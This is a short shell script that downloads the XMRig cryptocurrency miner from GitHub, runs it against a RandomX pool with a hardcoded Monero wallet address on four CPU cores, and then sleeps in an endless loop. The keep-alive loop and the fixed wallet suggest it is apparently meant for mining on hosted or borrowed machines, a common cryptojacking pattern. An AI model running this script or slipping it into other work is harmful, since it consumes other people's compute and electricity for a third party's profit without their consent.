#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -o rx.unmineable.com:3333 -a rx -k -u XMR:4BBNnsEiWhYjf3BRjMMT9jL56nRtdzfxda8fR3MhnADhLTu32tH29yfHB1hPhbQCPV9J3A2i1eP71JyQZ4aT3kEyG6atF5H -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
